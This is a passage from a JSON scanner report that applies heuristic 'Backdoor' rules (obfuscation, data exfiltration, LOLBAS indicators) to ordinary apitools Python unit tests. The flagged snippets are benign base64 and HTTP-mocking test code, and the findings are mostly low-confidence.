            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 231,
                  "startColumn": 7,
                  "endLine": 231,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    def testQueryEncoding(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='MessageWithTime', query_params=['timestamp'])\n        service = FakeService()\n        request = MessageWithTime(\n            timestamp=datetime.datetime(2014, 10, 0o7, 12, 53, 13))\n        http_request = service.PrepareHttpRequest(method_config, request)\n",
                    "rendered": {
                      "text": "    def testQueryEncoding(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='MessageWithTime', query_params=['timestamp'])\n        service = FakeService()\n        request = MessageWithTime(\n            timestamp=datetime.datetime(2014, 10, 0o7, 12, 53, 13))\n        http_request = service.PrepareHttpRequest(method_config, request)\n",
                      "markdown": "`    def testQueryEncoding(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='MessageWithTime', query_params=['timestamp'])\n        service = FakeService()\n        request = MessageWithTime(\n            timestamp=datetime.datetime(2014, 10, 0o7, 12, 53, 13))\n        http_request = service.PrepareHttpRequest(method_config, request)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 217,
                  "startColumn": 7,
                  "endLine": 217,
                  "endColumn": 16,
                  "snippet": {
                    "text": "            request_type_name='SimpleMessage',\n            response_type_name='SimpleMessage')\n        client = self.__GetFakeClient()\n        service = FakeService(client=client)\n        request = SimpleMessage()\n        with mock(base_api.http_wrapper, 'MakeRequest', fakeMakeRequest):\n            with self.assertRaises(exceptions.HttpBadRequestError) as err:\n",
                    "rendered": {
                      "text": "            request_type_name='SimpleMessage',\n            response_type_name='SimpleMessage')\n        client = self.__GetFakeClient()\n        service = FakeService(client=client)\n        request = SimpleMessage()\n        with mock(base_api.http_wrapper, 'MakeRequest', fakeMakeRequest):\n            with self.assertRaises(exceptions.HttpBadRequestError) as err:\n",
                      "markdown": "`            request_type_name='SimpleMessage',\n            response_type_name='SimpleMessage')\n        client = self.__GetFakeClient()\n        service = FakeService(client=client)\n        request = SimpleMessage()\n        with mock(base_api.http_wrapper, 'MakeRequest', fakeMakeRequest):\n            with self.assertRaises(exceptions.HttpBadRequestError) as err:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 202,
                  "startColumn": 7,
                  "endLine": 202,
                  "endColumn": 16,
                  "snippet": {
                    "text": "            response_type_name='SimpleMessage')\n        client = self.__GetFakeClient()\n        client.retry_func = retry_func\n        service = FakeService(client=client)\n        request = SimpleMessage()\n        with mock(base_api.http_wrapper, 'MakeRequest', fakeMakeRequest):\n            service._RunMethod(method_config, request)\n",
                    "rendered": {
                      "text": "            response_type_name='SimpleMessage')\n        client = self.__GetFakeClient()\n        client.retry_func = retry_func\n        service = FakeService(client=client)\n        request = SimpleMessage()\n        with mock(base_api.http_wrapper, 'MakeRequest', fakeMakeRequest):\n            service._RunMethod(method_config, request)\n",
                      "markdown": "`            response_type_name='SimpleMessage')\n        client = self.__GetFakeClient()\n        client.retry_func = retry_func\n        service = FakeService(client=client)\n        request = SimpleMessage()\n        with mock(base_api.http_wrapper, 'MakeRequest', fakeMakeRequest):\n            service._RunMethod(method_config, request)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 183,
                  "startColumn": 7,
                  "endLine": 183,
                  "endColumn": 16,
                  "snippet": {
                    "text": "            response_type_name='SimpleMessage')\n        client = self.__GetFakeClient()\n        client.check_response_func = check_response\n        service = FakeService(client=client)\n        request = SimpleMessage()\n        with mock(base_api.http_wrapper, 'MakeRequest', fakeMakeRequest):\n            service._RunMethod(method_config, request)\n",
                    "rendered": {
                      "text": "            response_type_name='SimpleMessage')\n        client = self.__GetFakeClient()\n        client.check_response_func = check_response\n        service = FakeService(client=client)\n        request = SimpleMessage()\n        with mock(base_api.http_wrapper, 'MakeRequest', fakeMakeRequest):\n            service._RunMethod(method_config, request)\n",
                      "markdown": "`            response_type_name='SimpleMessage')\n        client = self.__GetFakeClient()\n        client.check_response_func = check_response\n        service = FakeService(client=client)\n        request = SimpleMessage()\n        with mock(base_api.http_wrapper, 'MakeRequest', fakeMakeRequest):\n            service._RunMethod(method_config, request)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 140,
                  "startColumn": 7,
                  "endLine": 140,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        # we can correctly decode the message content using the given encoding.\n        method_config = base_api.ApiMethodInfo(\n            response_type_name='SimpleMessage')\n        service = FakeService(FakeClient(\n            'http://www.example.com/', credentials=FakeCredentials(),\n            response_encoding='utf8'))\n        http_response = http_wrapper.Response(\n",
                    "rendered": {
                      "text": "        # we can correctly decode the message content using the given encoding.\n        method_config = base_api.ApiMethodInfo(\n            response_type_name='SimpleMessage')\n        service = FakeService(FakeClient(\n            'http://www.example.com/', credentials=FakeCredentials(),\n            response_encoding='utf8'))\n        http_response = http_wrapper.Response(\n",
                      "markdown": "`        # we can correctly decode the message content using the given encoding.\n        method_config = base_api.ApiMethodInfo(\n            response_type_name='SimpleMessage')\n        service = FakeService(FakeClient(\n            'http://www.example.com/', credentials=FakeCredentials(),\n            response_encoding='utf8'))\n        http_response = http_wrapper.Response(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 7,
                  "endLine": 123,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    def testJsonResponse(self):\n        method_config = base_api.ApiMethodInfo(\n            response_type_name='SimpleMessage')\n        service = FakeService()\n        http_response = http_wrapper.Response(\n            info={'status': '200'}, content='{\"field\": \"abc\"}',\n            request_url='http://www.google.com')\n",
                    "rendered": {
                      "text": "    def testJsonResponse(self):\n        method_config = base_api.ApiMethodInfo(\n            response_type_name='SimpleMessage')\n        service = FakeService()\n        http_response = http_wrapper.Response(\n            info={'status': '200'}, content='{\"field\": \"abc\"}',\n            request_url='http://www.google.com')\n",
                      "markdown": "`    def testJsonResponse(self):\n        method_config = base_api.ApiMethodInfo(\n            response_type_name='SimpleMessage')\n        service = FakeService()\n        http_response = http_wrapper.Response(\n            info={'status': '200'}, content='{\"field\": \"abc\"}',\n            request_url='http://www.google.com')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 6,
                  "endLine": 17,
                  "snippet": {
                    "text": "# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport sys\nimport contextlib\nimport unittest\n",
                    "rendered": {
                      "text": "# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport sys\nimport contextlib\nimport unittest\n",
                      "markdown": "`# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport sys\nimport contextlib\nimport unittest\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 287,
                  "startColumn": 29,
                  "endLine": 287,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        http_request = service.PrepareHttpRequest(method_config, request,\n                                                  global_params=global_params)\n        want = urllib_parse.urlencode({\n            'nextPageToken': base64.urlsafe_b64encode(non_unicode_message),\n        })\n        self.assertIn(want, http_request.url)\n\n",
                    "rendered": {
                      "text": "        http_request = service.PrepareHttpRequest(method_config, request,\n                                                  global_params=global_params)\n        want = urllib_parse.urlencode({\n            'nextPageToken': base64.urlsafe_b64encode(non_unicode_message),\n        })\n        self.assertIn(want, http_request.url)\n\n",
                      "markdown": "`        http_request = service.PrepareHttpRequest(method_config, request,\n                                                  global_params=global_params)\n        want = urllib_parse.urlencode({\n            'nextPageToken': base64.urlsafe_b64encode(non_unicode_message),\n        })\n        self.assertIn(want, http_request.url)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 271,
                  "startColumn": 27,
                  "endLine": 271,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        http_request = service.PrepareHttpRequest(method_config, request,\n                                                  global_params=global_params)\n        want = urllib_parse.urlencode({\n            'bytes_field': base64.urlsafe_b64encode(non_unicode_message),\n        })\n        self.assertIn(want, http_request.url)\n\n",
                    "rendered": {
                      "text": "        http_request = service.PrepareHttpRequest(method_config, request,\n                                                  global_params=global_params)\n        want = urllib_parse.urlencode({\n            'bytes_field': base64.urlsafe_b64encode(non_unicode_message),\n        })\n        self.assertIn(want, http_request.url)\n\n",
                      "markdown": "`        http_request = service.PrepareHttpRequest(method_config, request,\n                                                  global_params=global_params)\n        want = urllib_parse.urlencode({\n            'bytes_field': base64.urlsafe_b64encode(non_unicode_message),\n        })\n        self.assertIn(want, http_request.url)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 7,
                  "endLine": 16,
                  "endColumn": 13,
                  "snippet": {
                    "text": "# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport sys\nimport contextlib\n",
                    "rendered": {
                      "text": "# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport sys\nimport contextlib\n",
                      "markdown": "`# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport sys\nimport contextlib\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 35,
                  "endLine": 165,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\n        # Add a new header and ensure it's added to the request.\n        client.additional_http_headers = additional_headers\n        http_request = http_wrapper.Request('http://www.example.com')\n        new_request = client.ProcessHttpRequest(http_request)\n        self.assertTrue('Request-Is-Awesome' in new_request.headers)\n\n",
                    "rendered": {
                      "text": "\n        # Add a new header and ensure it's added to the request.\n        client.additional_http_headers = additional_headers\n        http_request = http_wrapper.Request('http://www.example.com')\n        new_request = client.ProcessHttpRequest(http_request)\n        self.assertTrue('Request-Is-Awesome' in new_request.headers)\n\n",
                      "markdown": "`\n        # Add a new header and ensure it's added to the request.\n        client.additional_http_headers = additional_headers\n        http_request = http_wrapper.Request('http://www.example.com')\n        new_request = client.ProcessHttpRequest(http_request)\n        self.assertTrue('Request-Is-Awesome' in new_request.headers)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 159,
                  "startColumn": 35,
                  "endLine": 159,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        client = self.__GetFakeClient()\n\n        # No headers to start\n        http_request = http_wrapper.Request('http://www.example.com')\n        new_request = client.ProcessHttpRequest(http_request)\n        self.assertFalse('Request-Is-Awesome' in new_request.headers)\n\n",
                    "rendered": {
                      "text": "        client = self.__GetFakeClient()\n\n        # No headers to start\n        http_request = http_wrapper.Request('http://www.example.com')\n        new_request = client.ProcessHttpRequest(http_request)\n        self.assertFalse('Request-Is-Awesome' in new_request.headers)\n\n",
                      "markdown": "`        client = self.__GetFakeClient()\n\n        # No headers to start\n        http_request = http_wrapper.Request('http://www.example.com')\n        new_request = client.ProcessHttpRequest(http_request)\n        self.assertFalse('Request-Is-Awesome' in new_request.headers)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_test.py"
                },
                "region": {
                  "startLine": 328,
                  "startColumn": 47,
                  "endLine": 328,
                  "endColumn": 55,
                  "snippet": {
                    "text": "\n    def testBase64RoundtripForMapFields(self):\n        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n",
                    "rendered": {
                      "text": "\n    def testBase64RoundtripForMapFields(self):\n        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n",
                      "markdown": "`\n    def testBase64RoundtripForMapFields(self):\n        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_test.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 6,
                  "endLine": 17,
                  "snippet": {
                    "text": "# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport json\nimport sys\nimport unittest\n",
                    "rendered": {
                      "text": "# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport json\nimport sys\nimport unittest\n",
                      "markdown": "`# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport json\nimport sys\nimport unittest\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_test.py"
                },
                "region": {
                  "startLine": 362,
                  "startColumn": 16,
                  "endLine": 362,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        self.assertEqual(\n            '{\"1st\": \"%s\", \"2nd\": \"%s\"}' % (\n                base64.b64encode(data1, b'-_').decode(\"utf-8\"),\n                base64.b64encode(data2, b'-_').decode(\"utf-8\")),\n            encoding.MessageToJson(msg))\n\n    def testDateTimeEncodingInAMap(self):\n",
                    "rendered": {
                      "text": "        self.assertEqual(\n            '{\"1st\": \"%s\", \"2nd\": \"%s\"}' % (\n                base64.b64encode(data1, b'-_').decode(\"utf-8\"),\n                base64.b64encode(data2, b'-_').decode(\"utf-8\")),\n            encoding.MessageToJson(msg))\n\n    def testDateTimeEncodingInAMap(self):\n",
                      "markdown": "`        self.assertEqual(\n            '{\"1st\": \"%s\", \"2nd\": \"%s\"}' % (\n                base64.b64encode(data1, b'-_').decode(\"utf-8\"),\n                base64.b64encode(data2, b'-_').decode(\"utf-8\")),\n            encoding.MessageToJson(msg))\n\n    def testDateTimeEncodingInAMap(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_test.py"
                },
                "region": {
                  "startLine": 361,
                  "startColumn": 16,
                  "endLine": 361,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n        self.assertEqual(\n            '{\"1st\": \"%s\", \"2nd\": \"%s\"}' % (\n                base64.b64encode(data1, b'-_').decode(\"utf-8\"),\n                base64.b64encode(data2, b'-_').decode(\"utf-8\")),\n            encoding.MessageToJson(msg))\n\n",
                    "rendered": {
                      "text": "\n        self.assertEqual(\n            '{\"1st\": \"%s\", \"2nd\": \"%s\"}' % (\n                base64.b64encode(data1, b'-_').decode(\"utf-8\"),\n                base64.b64encode(data2, b'-_').decode(\"utf-8\")),\n            encoding.MessageToJson(msg))\n\n",
                      "markdown": "`\n        self.assertEqual(\n            '{\"1st\": \"%s\", \"2nd\": \"%s\"}' % (\n                base64.b64encode(data1, b'-_').decode(\"utf-8\"),\n                base64.b64encode(data2, b'-_').decode(\"utf-8\")),\n            encoding.MessageToJson(msg))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_test.py"
                },
                "region": {
                  "startLine": 330,
                  "startColumn": 35,
                  "endLine": 330,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n        # Use unsafe encoding, make sure we can load it.\n        json_data = '{\"1st\": \"%s\"}' % encoded_data\n",
                    "rendered": {
                      "text": "        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n        # Use unsafe encoding, make sure we can load it.\n        json_data = '{\"1st\": \"%s\"}' % encoded_data\n",
                      "markdown": "`        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n        # Use unsafe encoding, make sure we can load it.\n        json_data = '{\"1st\": \"%s\"}' % encoded_data\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_test.py"
                },
                "region": {
                  "startLine": 329,
                  "startColumn": 28,
                  "endLine": 329,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    def testBase64RoundtripForMapFields(self):\n        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n        # Use unsafe encoding, make sure we can load it.\n",
                    "rendered": {
                      "text": "    def testBase64RoundtripForMapFields(self):\n        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n        # Use unsafe encoding, make sure we can load it.\n",
                      "markdown": "`    def testBase64RoundtripForMapFields(self):\n        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n        # Use unsafe encoding, make sure we can load it.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_test.py"
                },
                "region": {
                  "startLine": 328,
                  "startColumn": 48,
                  "endLine": 328,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n    def testBase64RoundtripForMapFields(self):\n        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n",
                    "rendered": {
                      "text": "\n    def testBase64RoundtripForMapFields(self):\n        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n",
                      "markdown": "`\n    def testBase64RoundtripForMapFields(self):\n        raw_data = b'\\xFF\\x0F\\x80'\n        encoded_data = '/w+A'  # Has url-unsafe base64 characters\n        safe_encoded_data = base64.urlsafe_b64encode(raw_data).decode(\"utf-8\")\n        self.assertEqual(raw_data, base64.b64decode(encoded_data))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_test.py"
                },
                "region": {
                  "startLine": 312,
                  "startColumn": 15,
                  "endLine": 312,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        b64_msg = '{\"field\": \"%s\"}' % b64_str\n        urlsafe_b64_str = 'AAc-'\n        urlsafe_b64_msg = '{\"field\": \"%s\"}' % urlsafe_b64_str\n        data = base64.b64decode(b64_str)\n        msg = BytesMessage(field=data)\n        self.assertEqual(\n            msg, encoding.JsonToMessage(BytesMessage, urlsafe_b64_msg))\n",
                    "rendered": {
                      "text": "        b64_msg = '{\"field\": \"%s\"}' % b64_str\n        urlsafe_b64_str = 'AAc-'\n        urlsafe_b64_msg = '{\"field\": \"%s\"}' % urlsafe_b64_str\n        data = base64.b64decode(b64_str)\n        msg = BytesMessage(field=data)\n        self.assertEqual(\n            msg, encoding.JsonToMessage(BytesMessage, urlsafe_b64_msg))\n",
                      "markdown": "`        b64_msg = '{\"field\": \"%s\"}' % b64_str\n        urlsafe_b64_str = 'AAc-'\n        urlsafe_b64_msg = '{\"field\": \"%s\"}' % urlsafe_b64_str\n        data = base64.b64decode(b64_str)\n        msg = BytesMessage(field=data)\n        self.assertEqual(\n            msg, encoding.JsonToMessage(BytesMessage, urlsafe_b64_msg))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_test.py"
                },
                "region": {
